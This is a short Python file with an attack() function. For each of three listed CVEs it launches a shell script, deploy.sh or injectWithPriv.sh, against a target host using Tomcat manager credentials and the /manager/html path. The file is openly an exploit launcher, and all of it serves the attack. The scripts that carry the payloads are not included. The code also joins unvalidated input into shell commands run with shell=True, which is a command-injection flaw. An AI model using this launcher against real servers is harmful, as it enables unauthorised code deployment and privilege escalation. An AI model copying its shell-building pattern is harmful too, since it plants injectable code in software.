import re
import subprocess

def attack(cve, host, manager):
    match = re.match(r'([\d\.]+):(\d+)(\/.*)?', host)
    if cve == "CVE-2008-2938":
        process = subprocess.Popen("sh deploy.sh "+manager[0]+" "+manager[1]+" /manager/html" +" "+ match.group(1) +" "+ match.group(2), shell=True)
    elif cve == "CVE-2014-3625":
        process = subprocess.Popen("sh deploy.sh "+manager[0]+" "+manager[1]+" /manager/html" +" "+ match.group(1) +" "+ match.group(2), shell=True)
    elif cve == "CVE-2016-1240":
        process = subprocess.Popen("sh injectWithPriv.sh "+manager[0]+" "+manager[1]+" /manager/html" +" "+ match.group(1) +" "+ match.group(2), shell=True)
    else:
        raise KeyError

    code = process.wait()

    if code != 0:
        raise RuntimeError
